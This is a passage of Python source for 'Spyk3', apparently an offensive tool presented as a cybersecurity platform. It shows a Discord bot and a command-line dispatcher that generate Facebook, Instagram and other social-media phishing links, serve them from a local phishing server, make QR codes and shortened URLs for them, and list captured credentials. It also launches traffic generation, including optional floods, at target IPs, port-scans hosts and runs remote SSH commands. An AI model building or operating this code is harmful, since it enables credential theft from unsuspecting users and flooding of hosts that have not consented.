            self.phishing_server = server
            self.server_running = True
            
            logger.info(f"Phishing server started on port {port}")
            return True
        except Exception as e:
            logger.error(f"Failed to start phishing server: {e}")
            return False
    
    def stop_phishing_server(self):
        """Stop phishing server"""
        if self.phishing_server and self.server_running:
            self.phishing_server.shutdown()
            self.phishing_server.server_close()
            self.server_running = False
            logger.info("Phishing server stopped")
    
    def get_server_url(self) -> str:
        """Get server URL"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return f"http://{local_ip}:{self.config.phishing_default_port}"
        except:
            return f"http://localhost:{self.config.phishing_default_port}"
    
    def generate_qr_code(self, link_id: str) -> Optional[str]:
        """Generate QR code for phishing link"""
        if not QRCODE_AVAILABLE:
            return None
        
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        
        url = link.get('phishing_url', '')
        if self.server_running:
            url = self.get_server_url()
        
        qr_filename = os.path.join(PHISHING_DIR, f"qr_{link_id}.png")
        
        try:
            qr = qrcode.QRCode(
                version=1,
                box_size=10,
                border=5
            )
            qr.add_data(url)
            qr.make(fit=True)
            
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(qr_filename)
            return qr_filename
        except Exception as e:
            logger.error(f"Failed to generate QR code: {e}")
            return None
    
    def shorten_url(self, link_id: str) -> Optional[str]:
        """Shorten phishing URL"""
        if not SHORTENER_AVAILABLE:
            return None
        
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        
        url = link.get('phishing_url', '')
        if self.server_running:
            url = self.get_server_url()
        
        try:
            import pyshorteners
            s = pyshorteners.Shortener()
            return s.tinyurl.short(url)
        except Exception as e:
            logger.error(f"Failed to shorten URL: {e}")
            return url

# =====================
# TIME MANAGER
# =====================
class TimeManager:
    """Time and date management with history tracking"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def get_current_time(self, full: bool = False) -> str:
        """Get current time"""
        now = datetime.datetime.now()
        timezone = now.astimezone().tzinfo
        
        if full:
            return (f"🕐 Current Time: {now.strftime('%H:%M:%S')} {timezone}\n"
                   f"   Unix Timestamp: {int(time.time())}\n"
                   f"   ISO Format: {now.isoformat()}")
        else:
            return f"🕐 Current Time: {now.strftime('%H:%M:%S')} {timezone}"
    
    def get_current_date(self, full: bool = False) -> str:
        """Get current date"""
        now = datetime.datetime.now()
        
        if full:
            return (f"📅 Current Date: {now.strftime('%A, %B %d, %Y')}\n"
                   f"   Day of Year: {now.timetuple().tm_yday}\n"
                   f"   Week Number: {now.isocalendar()[1]}\n"
                   f"   ISO Format: {now.date().isoformat()}")
        else:
            return f"📅 Current Date: {now.strftime('%A, %B %d, %Y')}"
    
    def get_datetime(self, full: bool = False) -> str:
        """Get current date and time"""
        now = datetime.datetime.now()
        
        if full:
            return (f"📅 Date: {now.strftime('%A, %B %d, %Y')}\n"
                   f"🕐 Time: {now.strftime('%H:%M:%S')} {now.astimezone().tzinfo}\n"
                   f"   Unix Timestamp: {int(time.time())}\n"
                   f"   ISO Format: {now.isoformat()}")
        else:
            return (f"📅 Date: {now.strftime('%A, %B %d, %Y')}\n"
                   f"🕐 Time: {now.strftime('%H:%M:%S')} {now.astimezone().tzinfo}")

# =====================
# DISCORD BOT
# =====================
class Spyk3Discord:
    """Discord bot integration"""
    
    def __init__(self, engine: IPAnalysisEngine, ssh_manager: SSHManager, 
                 traffic_gen: TrafficGeneratorEngine, social_tools: SocialEngineeringTools,
                 time_manager: TimeManager, db: DatabaseManager, config: Config):
        self.engine = engine
        self.ssh = ssh_manager
        self.traffic_gen = traffic_gen
        self.social = social_tools
        self.time = time_manager
        self.db = db
        self.config = config
        self.bot = None
        self.running = False
    
    async def start(self):
        """Start Discord bot"""
        if not DISCORD_AVAILABLE:
            logger.error("Discord.py not installed")
            return False
        
        if not self.config.discord_token:
            logger.error("Discord token not configured")
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            
            self.bot = commands.Bot(
                command_prefix='!', 
                intents=intents,
                help_command=None
            )
            
            @self.bot.event
            async def on_ready():
                logger.info(f'Discord bot connected as {self.bot.user}')
                await self.bot.change_presence(
                    activity=discord.Activity(
                        type=discord.ActivityType.watching,
                        name="!help | Spyk3 v1.0.0"
                    )
                )
            
            @self.bot.command(name='help')
            async def help_command(ctx):
                embed = discord.Embed(
                    title="Spyk3 v1.0.0 - Help",
                    description="Ultimate Cybersecurity Platform",
                    color=discord.Color.blue()
                )
                
                embed.add_field(
                    name="🔍 IP ANALYSIS",
                    value="`!analyze <ip>` - Complete IP analysis\n`!ping <ip>` - Ping IP\n`!scan <ip>` - Port scan",
                    inline=False
                )
                
                embed.add_field(
                    name="⏰ TIME COMMANDS",
                    value="`!time` - Current time\n`!date` - Current date\n`!datetime` - Date and time\n`!history` - Command history",
                    inline=False
                )
                
                embed.add_field(
                    name="🔌 SSH COMMANDS",
                    value="`!ssh_list` - List servers\n`!ssh_connect <id>` - Connect\n`!ssh_exec <id> <cmd>` - Execute\n`!ssh_add <name> <host> <user>` - Add server",
                    inline=False
                )
                
                embed.add_field(
                    name="🚀 TRAFFIC",
                    value="`!traffic_types` - List types\n`!traffic_gen <type> <ip> <duration>` - Generate\n`!traffic_status` - Check status\n`!traffic_stop [id]` - Stop",
                    inline=False
                )
                
                embed.add_field(
                    name="🎣 SOCIAL",
                    value="`!phish_facebook` - Facebook link\n`!phish_instagram` - Instagram\n`!phish_start <id>` - Start server\n`!phish_creds [id]` - View credentials",
                    inline=False
                )
                
                embed.add_field(
                    name="🔒 IP MANAGEMENT",
                    value="`!block <ip> [reason]` - Block IP\n`!unblock <ip>` - Unblock\n`!blocked` - List blocked",
                    inline=False
                )
                
                await ctx.send(embed=embed)
            
            @self.bot.command(name='analyze')
            async def analyze_command(ctx, target: str):
                await ctx.send(f"Analyzing `{target}`... This may take a minute.")
                
                result, reports = self.engine.analyze_ip(target, generate_report=True, report_format=self.config.report_format)
                
                if result.success:
                    embed = discord.Embed(
                        title=f"IP Analysis: {result.target_ip}",
                        color=discord.Color.red() if result.security_status.get('risk_level') in ['critical', 'high'] else discord.Color.green(),
                        timestamp=datetime.datetime.now()
                    )
                    
                    ping = result.ping_result
                    ping_text = f"{'Online' if ping.get('success') else 'Offline'}"
                    if ping.get('avg_rtt'):
                        ping_text += f"\nAvg: {ping.get('avg_rtt')}ms"
                    embed.add_field(name="Ping", value=ping_text, inline=True)
                    
                    geo = result.geolocation_result
                    geo_text = f"{geo.get('country', 'Unknown')}\n{geo.get('city', 'Unknown')}"
                    embed.add_field(name="Location", value=geo_text, inline=True)
                    
                    ports = result.port_scan_result.get('open_ports', [])
                    port_text = f"Open ports: {len(ports)}"
                    if ports:
                        top_ports = [str(p.get('port', '')) for p in ports[:3]]
                        port_text += f"\nPorts: {', '.join(top_ports)}"
                    embed.add_field(name="Port Scan", value=port_text, inline=True)
                    
                    security = result.security_status
                    risk_text = f"Risk: {security.get('risk_level', 'unknown').upper()}\nScore: {security.get('risk_score', 0)}"
                    embed.add_field(name="Security", value=risk_text, inline=True)
                    
                    await ctx.send(embed=embed)
                    
                    if reports:
                        await ctx.send("**Generated Reports:**")
                        if 'pdf' in reports:
                            await ctx.send(file=discord.File(reports['pdf']))
                        if 'html' in reports:
                            await ctx.send(file=discord.File(reports['html']))
                else:
                    await ctx.send(f"Analysis failed: {result.error}")
            
            @self.bot.command(name='ping')
            async def ping_command(ctx, target: str):
                await ctx.send(f"Pinging `{target}`...")
                result = self.engine.ping_target(target)
                
                if result.get('success'):
                    embed = discord.Embed(
                        title=f"Ping Results: {target}",
                        color=discord.Color.green()
                    )
                    embed.add_field(name="Average RTT", value=f"{result.get('avg_rtt', 'N/A')}ms")
                    embed.add_field(name="Packet Loss", value=f"{result.get('packet_loss', 0)}%")
                    await ctx.send(embed=embed)
                else:
                    await ctx.send(f"Ping failed: {result.get('output', 'Unknown error')}")
            
            @self.bot.command(name='scan')
            async def scan_command(ctx, target: str):
                await ctx.send(f"Scanning `{target}`...")
                result = self.engine.scan_ports(target)
                
                open_ports = result.get('open_ports', [])
                if open_ports:
                    embed = discord.Embed(
                        title=f"Port Scan: {target}",
                        description=f"Found {len(open_ports)} open ports",
                        color=discord.Color.orange()
                    )
                    
                    port_list = [f"`{p.get('port')}` ({p.get('service', 'unknown')})" for p in open_ports[:10]]
                    embed.add_field(name="Open Ports", value="\n".join(port_list) or "None")
                    
                    await ctx.send(embed=embed)
                else:
                    await ctx.send(f"No open ports found on {target}")
            
            @self.bot.command(name='time')
            async def time_command(ctx):
                result = self.time.get_current_time()
                await ctx.send(result)
            
            @self.bot.command(name='date')
            async def date_command(ctx):
                result = self.time.get_current_date()
                await ctx.send(result)
            
            @self.bot.command(name='datetime')
            async def datetime_command(ctx):
                result = self.time.get_datetime()
                await ctx.send(result)
            
            @self.bot.command(name='history')
            async def history_command(ctx, limit: int = 10):
                history = self.db.get_command_history(limit)
                if history:
                    embed = discord.Embed(
                        title="Command History",
                        color=discord.Color.blue()
                    )
                    for cmd in history:
                        status = "✅" if cmd.get('success') else "❌"
                        embed.add_field(
                            name=f"{status} [{cmd.get('source')}]",
                            value=f"`{cmd.get('command', '')[:50]}`\n{cmd.get('timestamp', '')[:16]}",
                            inline=False
                        )
                    await ctx.send(embed=embed)
                else:
                    await ctx.send("No command history found")
            
            @self.bot.command(name='ssh_list')
            async def ssh_list_command(ctx):
                servers = self.ssh.get_servers()
                if servers:
                    embed = discord.Embed(
                        title="SSH Servers",
                        color=discord.Color.blue()
                    )
                    for server in servers:
                        status = "🔌 Connected" if server.get('connected') else "❌ Disconnected"
                        embed.add_field(
                            name=f"{server.get('name')} ({server.get('id')})",
                            value=f"`{server.get('user')}@{server.get('host')}:{server.get('port')}`\n{status}",
                            inline=False
                        )
                    await ctx.send(embed=embed)
                else:
                    await ctx.send("No SSH servers configured")
            
            @self.bot.command(name='ssh_connect')
            async def ssh_connect_command(ctx, server_id: str):
                await ctx.send(f"Connecting to server `{server_id}`...")
                result = self.ssh.connect(server_id)
                if result['success']:
                    await ctx.send(f"✅ Connected to {result.get('server', {}).get('name', server_id)}")
                else:
                    await ctx.send(f"❌ Connection failed: {result.get('error', 'Unknown error')}")
            
            @self.bot.command(name='ssh_exec')
            async def ssh_exec_command(ctx, server_id: str, *, command: str):
                await ctx.send(f"Executing command on `{server_id}`...")
                result = self.ssh.execute_command(server_id, command, executed_by=f"discord:{ctx.author}")
                
                if result['success']:
                    output = result.get('output', '')
                    if len(output) > 1500:
                        output = output[:1500] + "\n... (truncated)"
                    await ctx.send(f"```{output}```")
                else:
                    await ctx.send(f"❌ Command failed: {result.get('error', 'Unknown error')}")
            
            @self.bot.command(name='ssh_add')
            async def ssh_add_command(ctx, name: str, host: str, username: str, password: str = None, port: int = 22):
                result = self.ssh.add_server(name, host, username, password, port=port)
                if result['success']:
                    await ctx.send(f"✅ SSH server added: {name} (ID: {result.get('server_id')})")
                else:
                    await ctx.send(f"❌ Failed to add server: {result.get('error', 'Unknown error')}")
            
            @self.bot.command(name='traffic_types')
            async def traffic_types_command(ctx):
                types = self.traffic_gen.get_available_traffic_types()
                help_text = self.traffic_gen.get_traffic_types_help()
                
                embed = discord.Embed(
                    title="Available Traffic Types",
                    description=help_text,
                    color=discord.Color.blue()
                )
                await ctx.send(embed=embed)
            
            @self.bot.command(name='traffic_gen')
            async def traffic_gen_command(ctx, traffic_type: str, target_ip: str, duration: int, port: str = None):
                try:
                    port_int = int(port) if port else None
                    generator = self.traffic_gen.generate_traffic(
                        traffic_type, target_ip, duration, port_int, 
                        executed_by=f"discord:{ctx.author}"
                    )
                    
                    embed = discord.Embed(
                        title="Traffic Generation Started",
                        color=discord.Color.green()
                    )
                    embed.add_field(name="Type", value=traffic_type)
                    embed.add_field(name="Target", value=target_ip)
                    embed.add_field(name="Duration", value=f"{duration}s")
                    embed.add_field(name="ID", value=generator.id)
                    
                    await ctx.send(embed=embed)
                except Exception as e:
                    await ctx.send(f"❌ {str(e)}")
            
            @self.bot.command(name='traffic_status')
            async def traffic_status_command(ctx):
                active = self.traffic_gen.get_active_generators()
                if active:
                    embed = discord.Embed(
                        title="Active Traffic Generators",
                        color=discord.Color.blue()
                    )
                    for gen in active:
                        embed.add_field(
                            name=f"ID: {gen['id']}",
                            value=f"Type: {gen['traffic_type']}\nTarget: {gen['target_ip']}\nPackets: {gen['packets_sent']}",
                            inline=False
                        )
                    await ctx.send(embed=embed)
                else:
                    await ctx.send("No active traffic generators")
            
            @self.bot.command(name='traffic_stop')
            async def traffic_stop_command(ctx, generator_id: str = None):
                if generator_id:
                    if self.traffic_gen.stop_generation(generator_id):
                        await ctx.send(f"✅ Stopped generator {generator_id}")
                    else:
                        await ctx.send(f"❌ Generator {generator_id} not found")
                else:
                    self.traffic_gen.stop_generation()
                    await ctx.send("✅ Stopped all traffic generators")
            
            @self.bot.command(name='phish_facebook')
            async def phish_facebook_command(ctx):
                result = self.social.generate_phishing_link('facebook')
                if result['success']:
                    embed = discord.Embed(
                        title="Facebook Phishing Link Generated",
                        color=discord.Color.blue()
                    )
                    embed.add_field(name="ID", value=result['link_id'])
                    embed.add_field(name="URL", value=result['phishing_url'])
                    await ctx.send(embed=embed)
                else:
                    await ctx.send(f"❌ {result.get('error', 'Generation failed')}")
            
            @self.bot.command(name='phish_instagram')
            async def phish_instagram_command(ctx):
                result = self.social.generate_phishing_link('instagram')
                if result['success']:
                    embed = discord.Embed(
                        title="Instagram Phishing Link Generated",
                        color=discord.Color.blue()
                    )
                    embed.add_field(name="ID", value=result['link_id'])
                    embed.add_field(name="URL", value=result['phishing_url'])
                    await ctx.send(embed=embed)
                else:
                    await ctx.send(f"❌ {result.get('error', 'Generation failed')}")
            
            @self.bot.command(name='phish_start')
            async def phish_start_command(ctx, link_id: str, port: int = None):
                success = self.social.start_phishing_server(link_id, port)
                if success:
                    url = self.social.get_server_url()
                    await ctx.send(f"✅ Phishing server started at {url}")
                else:
                    await ctx.send(f"❌ Failed to start phishing server")
            
            @self.bot.command(name='phish_stop')
            async def phish_stop_command(ctx):
                self.social.stop_phishing_server()
                await ctx.send("✅ Phishing server stopped")
            
            @self.bot.command(name='phish_qr')
            async def phish_qr_command(ctx, link_id: str):
                qr_path = self.social.generate_qr_code(link_id)
                if qr_path:
                    await ctx.send(file=discord.File(qr_path))
                else:
                    await ctx.send("❌ Failed to generate QR code")
            
            @self.bot.command(name='phish_shorten')
            async def phish_shorten_command(ctx, link_id: str):
                short_url = self.social.shorten_url(link_id)
                if short_url:
                    await ctx.send(f"✅ Shortened URL: {short_url}")
                else:
                    await ctx.send("❌ Failed to shorten URL")
            
            @self.bot.command(name='block')
            @commands.has_permissions(administrator=True)
            async def block_command(ctx, ip: str, *, reason: str = "High risk detected"):
                try:
                    ipaddress.ip_address(ip)
                except:
                    await ctx.send(f"❌ Invalid IP address: {ip}")
                    return
                
                success = self.db.block_ip(ip, reason, f"discord:{ctx.author}")
                
                if success:
                    embed = discord.Embed(
                        title="IP Blocked",
                        description=f"**IP:** `{ip}`\n**Reason:** {reason}\n**Blocked by:** {ctx.author.mention}",
                        color=discord.Color.red()
                    )
                    await ctx.send(embed=embed)
                else:
                    await ctx.send(f"❌ Failed to block {ip}")
            
            @self.bot.command(name='unblock')
            @commands.has_permissions(administrator=True)
            async def unblock_command(ctx, ip: str):
                success = self.db.unblock_ip(ip)
                
                if success:
                    embed = discord.Embed(
                        title="IP Unblocked",
                        description=f"**IP:** `{ip}`\n**Unblocked by:** {ctx.author.mention}",
                        color=discord.Color.green()
                    )
                    await ctx.send(embed=embed)
                else:
                    await ctx.send(f"❌ Failed to unblock {ip}")
            
            @self.bot.command(name='blocked')
            async def blocked_command(ctx):
                blocked = self.db.get_blocked_ips(active_only=True)
                
                if not blocked:
                    await ctx.send("No IPs are currently blocked.")
                    return
                
                embed = discord.Embed(
                    title=f"Blocked IPs ({len(blocked)})",
                    color=discord.Color.red()
                )
                
                for ip_data in blocked[:10]:
                    embed.add_field(
                        name=f"`{ip_data['ip_address']}`",
                        value=f"Reason: {ip_data.get('reason', 'N/A')[:50]}",
                        inline=False
                    )
                
                await ctx.send(embed=embed)
            
            self.running = True
            await self.bot.start(self.config.discord_token)
            return True
        except Exception as e:
            logger.error(f"Discord bot error: {e}")
            return False
    
    def start_bot_thread(self):
        """Start Discord bot in thread"""
        if self.config.discord_enabled and self.config.discord_token:
            thread = threading.Thread(target=self._run_discord_bot, daemon=True)
            thread.start()
            logger.info("Discord bot started in background")
            return True
        return False
    
    def _run_discord_bot(self):
        """Run Discord bot in thread"""
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Discord bot thread error: {e}")

# =====================
# MAIN APPLICATION
# =====================
class Spyk3App:
    """Main application"""
    
    def __init__(self):
        self.config = ConfigManager.load_config()
        self.db = DatabaseManager()
        self.engine = IPAnalysisEngine(self.config)
        self.ssh_manager = SSHManager(self.db, self.config)
        self.traffic_gen = TrafficGeneratorEngine(self.db, self.config)
        self.social_tools = SocialEngineeringTools(self.db, self.config)
        self.time_manager = TimeManager(self.db)
        self.discord_bot = Spyk3Discord(
            self.engine, self.ssh_manager, self.traffic_gen,
            self.social_tools, self.time_manager, self.db, self.config
        )
        self.running = True
    
    def print_banner(self):
        """Print application banner"""
        banner = f"""
{Colors.PRIMARY}╔═══════════════════════════════════════════════════════════════════════════╗
║{Colors.SUCCESS}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}                     SPYK3-S3RV3R v0.0.2                                   {Colors.PRIMARY}║
║{Colors.SUCCESS}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}                                                                           {Colors.PRIMARY}║
╠═══════════════════════════════════════════════════════════════════════════╣
║{Colors.SECONDARY}  FEATURES:                                                            {Colors.PRIMARY}║
║{Colors.SECONDARY}  • IP Analysis with Graphical Reports & Statistics                    {Colors.PRIMARY}║
║{Colors.SECONDARY}  • SSH Remote Command Execution on Multiple Servers                   {Colors.PRIMARY}║
║{Colors.SECONDARY}  • Real Traffic Generation (ICMP, TCP, UDP, HTTP, DNS)                {Colors.PRIMARY}║
║{Colors.SECONDARY}  • Social Engineering Suite with Phishing Pages                       {Colors.PRIMARY}║
║{Colors.SECONDARY}  • Time/Date Commands with History Tracking                           {Colors.PRIMARY}║
║{Colors.SECONDARY}  • Multi-Platform Integration (Discord, Telegram, Slack)              {Colors.PRIMARY}║
║{Colors.SECONDARY}  • IP Management & Threat Detection                                   {Colors.PRIMARY}║
╚═══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)
    
    def print_help(self):
        """Print help menu"""
        help_text = f"""
{Colors.PRIMARY}AVAILABLE COMMANDS:{Colors.RESET}

{Colors.SECONDARY}IP ANALYSIS:{Colors.RESET}
  analyze <ip>        - Complete IP analysis with report generation
  ping <ip>           - Ping target IP address
  scan <ip>           - Scan common ports on target IP
  location <ip>       - Get geolocation of IP

{Colors.SECONDARY}SSH REMOTE COMMANDS:{Colors.RESET}
  ssh_add <name> <host> <user> [password] [port] - Add SSH server
  ssh_list            - List configured SSH servers
  ssh_connect <id>    - Connect to SSH server
  ssh_exec <id> <cmd> - Execute command on remote server
  ssh_upload <id> <local> <remote> - Upload file
  ssh_download <id> <remote> <local> - Download file
  ssh_disconnect [id] - Disconnect from server(s)

{Colors.SECONDARY}TRAFFIC GENERATION:{Colors.RESET}
  traffic_types       - List available traffic types
  traffic_gen <type> <ip> <duration> [port] - Generate traffic
  traffic_status      - Check active generators
  traffic_stop [id]   - Stop traffic generation
  traffic_logs        - View traffic generation history

{Colors.SECONDARY}TIME COMMANDS:{Colors.RESET}
  time                - Show current time
  date                - Show current date
  datetime            - Show both date and time
  history [limit]     - View command history

{Colors.SECONDARY}SOCIAL ENGINEERING:{Colors.RESET}
  phish_facebook      - Generate Facebook phishing link
  phish_instagram     - Generate Instagram phishing link
  phish_twitter       - Generate Twitter phishing link
  phish_gmail         - Generate Gmail phishing link
  phish_linkedin      - Generate LinkedIn phishing link
  phish_start <id> [port] - Start phishing server
  phish_stop          - Stop phishing server
  phish_status        - Check server status
  phish_qr <id>       - Generate QR code
  phish_shorten <id>  - Shorten URL

{Colors.SECONDARY}IP MANAGEMENT:{Colors.RESET}
  block <ip> [reason] - Block an IP address
  unblock <ip>        - Unblock an IP address
  blocked             - List blocked IPs

{Colors.SECONDARY}SYSTEM:{Colors.RESET}
  help                - Show this help menu
  status              - Show system status
  clear               - Clear screen
  exit                - Exit application

{Colors.SECONDARY}DISCORD BOT:{Colors.RESET}
  start_discord       - Start Discord bot (if configured)

{Colors.PRIMARY}Examples:{Colors.RESET}
  analyze 8.8.8.8
  ssh_add myserver 192.168.1.100 root password123
  ssh_exec myserver "ls -la"
  traffic_gen icmp 192.168.1.1 10
  phish_facebook
  phish_start abc12345 8080
  block 10.0.0.5 "Port scanning"
        """
        print(help_text)
    
    def setup_configuration(self):
        """Setup configuration"""
        print(f"\n{Colors.PRIMARY}Spyk3 Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        # Discord setup
        setup_discord = input(f"\n{Colors.SECONDARY}Setup Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup_discord == 'y':
            self.config.discord_enabled = True
            self.config.discord_token = input(f"{Colors.SECONDARY}Enter Discord bot token: {Colors.RESET}").strip()
            self.config.discord_channel_id = input(f"{Colors.SECONDARY}Enter channel ID (optional): {Colors.RESET}").strip()
            self.config.discord_admin_role = input(f"{Colors.SECONDARY}Enter admin role name (default: Admin): {Colors.RESET}").strip() or "Admin"
        
        # SSH setup
        print(f"\n{Colors.PRIMARY}SSH Configuration:{Colors.RESET}")
        self.config.ssh_enabled = True
        timeout = input(f"{Colors.SECONDARY}Default SSH timeout (seconds) [30]: {Colors.RESET}").strip()
        if timeout:
            self.config.ssh_default_timeout = int(timeout)
        max_conn = input(f"{Colors.SECONDARY}Max SSH connections [5]: {Colors.RESET}").strip()
        if max_conn:
            self.config.ssh_max_connections = int(max_conn)
        
        # Traffic setup
        print(f"\n{Colors.PRIMARY}Traffic Configuration:{Colors.RESET}")
        max_dur = input(f"{Colors.SECONDARY}Max traffic duration (seconds) [300]: {Colors.RESET}").strip()
        if max_dur:
            self.config.traffic_max_duration = int(max_dur)
        allow_floods = input(f"{Colors.SECONDARY}Allow flood traffic? (y/n) [n]: {Colors.RESET}").strip().lower()
        self.config.traffic_allow_floods = allow_floods == 'y'
        
        # Phishing setup
        print(f"\n{Colors.PRIMARY}Phishing Configuration:{Colors.RESET}")
        port = input(f"{Colors.SECONDARY}Default phishing port [8080]: {Colors.RESET}").strip()
        if port:
            self.config.phishing_default_port = int(port)
        
        ConfigManager.save_config(self.config)
        print(f"{Colors.SUCCESS}Configuration saved!{Colors.RESET}")
    
    def process_command(self, command: str):
        """Process command"""
        if not command.strip():
            return
        
        parts = command.strip().split()
        cmd = parts[0].lower()
        args = parts[1:]
        
        if cmd == 'help':
            self.print_help()
        
        elif cmd == 'analyze':
            if not args:
                print(f"{Colors.ERROR}Please provide an IP address or hostname{Colors.RESET}")
                return
            
            target = args[0]
            print(f"\n{Colors.SECONDARY}Analyzing {Colors.SUCCESS}{target}{Colors.SECONDARY}...{Colors.RESET}")
            
            result, reports = self.engine.analyze_ip(target, generate_report=True, report_format=self.config.report_format)
            
            if result.success:
                self._print_analysis_result(result)
                
                if reports:
                    print(f"\n{Colors.SUCCESS}Reports generated:{Colors.RESET}")
                    for format_type, report_path in reports.items():
                        print(f"  • {format_type.upper()}: {report_path}")
            else:
                print(f"{Colors.ERROR}Analysis failed: {result.error}{Colors.RESET}")
        
        elif cmd == 'ping':
            if not args:
                print(f"{Colors.ERROR}Please provide an IP address{Colors.RESET}")
                return
            
            target = args[0]
            result = self.engine.ping_target(target)
            
            if result.get('success'):
                print(f"\n{Colors.SUCCESS}Ping results for {target}:{Colors.RESET}")
                print(f"  Average RTT: {result.get('avg_rtt', 'N/A')}ms")
                print(f"  Packet Loss: {result.get('packet_loss', 0)}%")
            else:
                print(f"{Colors.ERROR}Ping failed: {result.get('output', 'Unknown error')}{Colors.RESET}")
        
        elif cmd == 'scan':
            if not args:
                print(f"{Colors.ERROR}Please provide an IP address{Colors.RESET}")
                return
            
            target = args[0]
            result = self.engine.scan_ports(target)
            
            open_ports = result.get('open_ports', [])
            if open_ports:
                print(f"\n{Colors.WARNING}Open ports on {target}:{Colors.RESET}")
                for port_info in open_ports:
                    print(f"  • Port {port_info.get('port')}: {port_info.get('service', 'unknown')}")
            else:
                print(f"{Colors.SUCCESS}No open ports found on {target}{Colors.RESET}")
        
        elif cmd == 'location':
            if not args:
                print(f"{Colors.ERROR}Please provide an IP address{Colors.RESET}")
                return
            
            target = args[0]
            result = self.engine.get_geolocation(target)
            
            if result.get('success'):
                print(f"\n{Colors.SUCCESS}Geolocation for {target}:{Colors.RESET}")
                print(f"  Country: {result.get('country', 'Unknown')}")
                print(f"  Region: {result.get('region', 'Unknown')}")
                print(f"  City: {result.get('city', 'Unknown')}")
                print(f"  ISP: {result.get('isp', 'Unknown')}")
            else:
                print(f"{Colors.ERROR}Geolocation lookup failed{Colors.RESET}")
        
        elif cmd == 'ssh_list':
            servers = self.ssh_manager.get_servers()
            if servers:
                print(f"\n{Colors.SECONDARY}SSH Servers:{Colors.RESET}")
                for server in servers:
                    status = "🔌 Connected" if server.get('connected') else "❌ Disconnected"
                    print(f"\n  {Colors.SUCCESS}{server.get('name')}{Colors.RESET} ({server.get('id')})")
                    print(f"    {server.get('username')}@{server.get('host')}:{server.get('port')}")
                    print(f"    Status: {status}")
            else:
                print(f"{Colors.WARNING}No SSH servers configured{Colors.RESET}")
        
        elif cmd == 'ssh_add':
            if len(args) < 3:
                print(f"{Colors.ERROR}Usage: ssh_add <name> <host> <username> [password] [port]{Colors.RESET}")
                return
            
            name = args[0]
            host = args[1]
            username = args[2]
            password = args[3] if len(args) > 3 else None
            port = int(args[4]) if len(args) > 4 and args[4].isdigit() else 22
            
            result = self.ssh_manager.add_server(name, host, username, password, port=port)
            
            if result['success']:
                print(f"{Colors.SUCCESS}✅ SSH server added: {name} (ID: {result.get('server_id')}){Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ Failed to add server: {result.get('error', 'Unknown error')}{Colors.RESET}")
        
        elif cmd == 'ssh_connect':
            if not args:
                print(f"{Colors.ERROR}Usage: ssh_connect <server_id>{Colors.RESET}")
                return
            
            server_id = args[0]
            result = self.ssh_manager.connect(server_id)
            
            if result['success']:
                print(f"{Colors.SUCCESS}✅ Connected to {result.get('server', {}).get('name', server_id)}{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ Connection failed: {result.get('error', 'Unknown error')}{Colors.RESET}")
        
        elif cmd == 'ssh_exec':
            if len(args) < 2:
                print(f"{Colors.ERROR}Usage: ssh_exec <server_id> <command>{Colors.RESET}")
                return
            
            server_id = args[0]
            command = ' '.join(args[1:])
            
            print(f"\n{Colors.SECONDARY}Executing on {server_id}...{Colors.RESET}")
            result = self.ssh_manager.execute_command(server_id, command)
            
            if result['success']:
                print(f"\n{Colors.SUCCESS}Output:{Colors.RESET}")
                print(result.get('output', ''))
            else:
                print(f"{Colors.ERROR}Command failed: {result.get('error', 'Unknown error')}{Colors.RESET}")
        
        elif cmd == 'ssh_upload':
            if len(args) < 3:
                print(f"{Colors.ERROR}Usage: ssh_upload <server_id> <local_path> <remote_path>{Colors.RESET}")
                return
            
            server_id = args[0]
            local = args[1]
            remote = args[2]
            
            if not os.path.exists(local):
                print(f"{Colors.ERROR}Local file not found: {local}{Colors.RESET}")
                return
            
            result = self.ssh_manager.upload_file(server_id, local, remote)
            
            if result['success']:
                print(f"{Colors.SUCCESS}✅ File uploaded to {remote}{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}Upload failed: {result.get('error', 'Unknown error')}{Colors.RESET}")
        
        elif cmd == 'ssh_download':
            if len(args) < 3:
                print(f"{Colors.ERROR}Usage: ssh_download <server_id> <remote_path> <local_path>{Colors.RESET}")
                return
            
            server_id = args[0]
            remote = args[1]
            local = args[2]
            
            result = self.ssh_manager.download_file(server_id, remote, local)
            
            if result['success']:
                print(f"{Colors.SUCCESS}✅ File downloaded to {local}{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}Download failed: {result.get('error', 'Unknown error')}{Colors.RESET}")
        
        elif cmd == 'ssh_disconnect':
            if args:
                self.ssh_manager.disconnect(args[0])
                print(f"{Colors.SUCCESS}Disconnected from {args[0]}{Colors.RESET}")
            else:
                self.ssh_manager.disconnect()
                print(f"{Colors.SUCCESS}Disconnected from all servers{Colors.RESET}")
        
        elif cmd == 'traffic_types':
            help_text = self.traffic_gen.get_traffic_types_help()
            print(f"\n{help_text}")
        
        elif cmd == 'traffic_gen':
            if len(args) < 3:
                print(f"{Colors.ERROR}Usage: traffic_gen <type> <ip> <duration> [port]{Colors.RESET}")
                return
            
            traffic_type = args[0]
            target_ip = args[1]
            try:
                duration = int(args[2])
            except:
                print(f"{Colors.ERROR}Invalid duration{Colors.RESET}")
                return
            
            port = None
            if len(args) >= 4:
                try:
                    port = int(args[3])
                except:
                    print(f"{Colors.ERROR}Invalid port{Colors.RESET}")
                    return
            
            try:
                generator = self.traffic_gen.generate_traffic(traffic_type, target_ip, duration, port)
                print(f"{Colors.SUCCESS}✅ Traffic generation started (ID: {generator.id}){Colors.RESET}")
                print(f"  Type: {traffic_type}")
                print(f"  Target: {target_ip}")
                print(f"  Duration: {duration}s")
            except Exception as e:
                print(f"{Colors.ERROR}❌ {str(e)}{Colors.RESET}")
        
        elif cmd == 'traffic_status':
            active = self.traffic_gen.get_active_generators()
            if active:
